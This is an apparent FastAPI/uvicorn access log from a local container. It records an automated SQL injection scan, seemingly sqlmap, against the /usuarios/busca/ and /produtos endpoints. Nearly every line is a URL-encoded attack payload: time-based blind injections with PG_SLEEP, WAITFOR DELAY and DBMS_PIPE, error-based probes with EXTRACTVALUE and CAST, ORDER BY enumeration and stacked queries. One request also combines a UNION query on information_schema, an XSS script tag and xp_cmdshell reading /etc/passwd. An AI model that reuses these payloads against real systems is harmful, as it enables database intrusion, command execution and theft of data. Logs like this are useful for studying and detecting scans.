api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:59602 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3461%3D%28SELECT%2F%2A%2A%2F3461%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59588 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3461%3D%28SELECT%2F%2A%2A%2F3461%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FRaqf HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59618 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27RdXn%27%3D%27RdXn HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59632 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27faVH%27%3D%27faVH HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59640 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%287263%3D7263 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59656 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59672 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FPzFU HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59686 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F4529%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%2883%29%7C%7CCHR%28107%29%7C%7CCHR%28105%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27UElX%27%3D%27UElX HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59692 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F4529%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%2883%29%7C%7CCHR%28107%29%7C%7CCHR%28105%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27ZGFD%27%3D%27ZGFD HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59700 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F4529%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%2883%29%7C%7CCHR%28107%29%7C%7CCHR%28105%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281467%3D1467 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59702 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4529%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%2883%29%7C%7CCHR%28107%29%7C%7CCHR%28105%29%2C5%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59726 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4529%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28114%29%7C%7CCHR%2883%29%7C%7CCHR%28107%29%7C%7CCHR%28105%29%2C5%29--%2F%2A%2A%2Fnopf HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59736 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FlsCH HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59714 - "GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F7019--%2F%2A%2A%2FMfgW HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59748 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2Fwwrx HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59762 - "GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F9727--%2F%2A%2A%2FpXSm HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59760 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FuuVY HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59768 - "GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F7861--%2F%2A%2A%2FTGTc HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59782 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FdQCE HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59780 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F4474--%2F%2A%2A%2FOgyq HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59790 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FnNmi HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59794 - "GET /usuarios/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F2678--%2F%2A%2A%2FjWRb HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52086 - "GET /produtos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52102 - "GET /produtos?Kjsw=9075%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52108 - "GET /produtos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52110 - "GET /3656 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52120 - "GET /produtos%2C%2C.%22%29%29%28%2C%2C%27 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52132 - "GET /produtos%27PPkYfd%3C%27%22%3EmARsTR HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52146 - "GET /produtos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52150 - "GET /produtos%29/%2A%2A/AND/%2A%2A/7752%3D1293/%2A%2A/AND/%2A%2A/%282053%3D2053 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52164 - "GET /produtos%29/%2A%2A/AND/%2A%2A/5483%3D5483/%2A%2A/AND/%2A%2A/%285153%3D5153 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52174 - "GET /produtos/%2A%2A/AND/%2A%2A/7777%3D3595 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52192 - "GET /produtos/%2A%2A/AND/%2A%2A/5483%3D5483 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52178 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/6555%3D7106/%2A%2A/AND/%2A%2A/%28%27whWc%27%3D%27whWc HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52208 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/5483%3D5483/%2A%2A/AND/%2A%2A/%28%27aQyZ%27%3D%27aQyZ HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52210 - "GET /produtos%27/%2A%2A/AND/%2A%2A/3127%3D3809/%2A%2A/AND/%2A%2A/%27BmpH%27%3D%27BmpH HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52218 - "GET /produtos%27/%2A%2A/AND/%2A%2A/5483%3D5483/%2A%2A/AND/%2A%2A/%27uDOj%27%3D%27uDOj HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52232 - "GET /produtos/%2A%2A/AND/%2A%2A/9343%3D6106--/%2A%2A/RSjp HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52248 - "GET /produtos/%2A%2A/AND/%2A%2A/5483%3D5483--/%2A%2A/lKzh HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52262 - "GET /%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%287606%3D9355%29/%2A%2A/THEN/%2A%2A/%27produtos%27/%2A%2A/ELSE/%2A%2A/%28SELECT/%2A%2A/9355/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/3186%29/%2A%2A/END%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52276 - "GET /%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%288542%3D8542%29/%2A%2A/THEN/%2A%2A/%27produtos%27/%2A%2A/ELSE/%2A%2A/%28SELECT/%2A%2A/2086/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/8923%29/%2A%2A/END%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52278 - "GET /produtos%29/%2A%2A/AND/%2A%2A/EXTRACTVALUE%286186%2CCONCAT%280x5c%2C0x71766a7171%2C%28SELECT/%2A%2A/%28ELT%286186%3D6186%2C1%29%29%29%2C0x716b706271%29%29/%2A%2A/AND/%2A%2A/%283618%3D3618 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52284 - "GET /produtos/%2A%2A/AND/%2A%2A/EXTRACTVALUE%286186%2CCONCAT%280x5c%2C0x71766a7171%2C%28SELECT/%2A%2A/%28ELT%286186%3D6186%2C1%29%29%29%2C0x716b706271%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52296 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/EXTRACTVALUE%286186%2CCONCAT%280x5c%2C0x71766a7171%2C%28SELECT/%2A%2A/%28ELT%286186%3D6186%2C1%29%29%29%2C0x716b706271%29%29/%2A%2A/AND/%2A%2A/%28%27ehMH%27%3D%27ehMH HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52308 - "GET /produtos%27/%2A%2A/AND/%2A%2A/EXTRACTVALUE%286186%2CCONCAT%280x5c%2C0x71766a7171%2C%28SELECT/%2A%2A/%28ELT%286186%3D6186%2C1%29%29%29%2C0x716b706271%29%29/%2A%2A/AND/%2A%2A/%27nIAi%27%3D%27nIAi HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52322 - "GET /produtos/%2A%2A/AND/%2A%2A/EXTRACTVALUE%286186%2CCONCAT%280x5c%2C0x71766a7171%2C%28SELECT/%2A%2A/%28ELT%286186%3D6186%2C1%29%29%29%2C0x716b706271%29%29--/%2A%2A/unal HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52326 - "GET /produtos%29/%2A%2A/AND/%2A%2A/6594%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286594%3D6594%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%285925%3D5925 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52344 - "GET /produtos/%2A%2A/AND/%2A%2A/6594%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286594%3D6594%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52334 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/6594%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286594%3D6594%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%28%27vkzg%27%3D%27vkzg HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52354 - "GET /produtos%27/%2A%2A/AND/%2A%2A/6594%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286594%3D6594%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%27CfsP%27%3D%27CfsP HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52356 - "GET /produtos/%2A%2A/AND/%2A%2A/6594%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286594%3D6594%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29--/%2A%2A/tIsg HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52362 - "GET /produtos%29/%2A%2A/AND/%2A%2A/7276/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%287276%3D7276%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%283929%3D3929 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52370 - "GET /produtos/%2A%2A/AND/%2A%2A/7276/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%287276%3D7276%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52376 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/7276/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%287276%3D7276%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%28%27HlaQ%27%3D%27HlaQ HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52378 - "GET /produtos%27/%2A%2A/AND/%2A%2A/7276/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%287276%3D7276%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%27cCYu%27%3D%27cCYu HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52390 - "GET /produtos/%2A%2A/AND/%2A%2A/7276/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%287276%3D7276%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29--/%2A%2A/DlFu HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52396 - "GET /produtos%29/%2A%2A/AND/%2A%2A/8767%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%288767%3D8767%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%287160%3D7160 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52402 - "GET /produtos/%2A%2A/AND/%2A%2A/8767%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%288767%3D8767%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52404 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/8767%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%288767%3D8767%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%28%27KjOf%27%3D%27KjOf HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52420 - "GET /produtos%27/%2A%2A/AND/%2A%2A/8767%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%288767%3D8767%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%27cYoF%27%3D%27cYoF HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52422 - "GET /produtos/%2A%2A/AND/%2A%2A/8767%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%288767%3D8767%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29--/%2A%2A/EISX HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52434 - "GET /%28SELECT/%2A%2A/CONCAT%28CONCAT%28%27qvjqq%27%2C%28CASE/%2A%2A/WHEN/%2A%2A/%286593%3D6593%29/%2A%2A/THEN/%2A%2A/%271%27/%2A%2A/ELSE/%2A%2A/%270%27/%2A%2A/END%29%29%2C%27qkpbq%27%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52444 - "GET /produtos%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52454 - "GET /produtos%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52466 - "GET /produtos%27%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52478 - "GET /produtos%27%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52450 - "GET /produtos%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52482 - "GET /produtos%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52488 - "GET /produtos%27%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52492 - "GET /produtos%27%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52500 - "GET /produtos%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2878%29%7C%7CCHR%2872%29%7C%7CCHR%28104%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52490 - "GET /produtos%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2878%29%7C%7CCHR%2872%29%7C%7CCHR%28104%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52508 - "GET /produtos%27%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2878%29%7C%7CCHR%2872%29%7C%7CCHR%28104%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52512 - "GET /produtos%27%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2872%29%7C%7CCHR%2878%29%7C%7CCHR%2872%29%7C%7CCHR%28104%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52524 - "GET /produtos%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/3919/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29wwDa%29/%2A%2A/AND/%2A%2A/%281533%3D1533 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:52538 - "GET /produtos/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/3919/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29wwDa%29 HTTP/1.1" 404 Not Found
